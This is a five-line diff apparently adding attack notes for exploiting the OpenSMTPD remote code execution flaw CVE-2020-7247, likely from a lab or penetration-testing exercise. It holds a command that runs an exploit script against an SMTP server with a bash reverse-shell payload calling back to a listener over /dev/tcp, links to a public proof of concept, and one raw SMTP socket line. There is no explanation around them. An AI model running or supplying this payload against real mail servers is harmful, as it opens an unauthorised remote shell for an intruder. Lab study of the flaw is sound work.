@@ -1,0 +1,5 @@
+python3 getShell.py 192.168.128.71 25 "bash -c 'bash -i >& /dev/tcp/192.168.49.128/53 0>&1'"
+https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/
+https://github.com/jopraveen/CVE-2020-7247
+
+s.send(b"RCPT TO:<neil@test.com>\r\n")
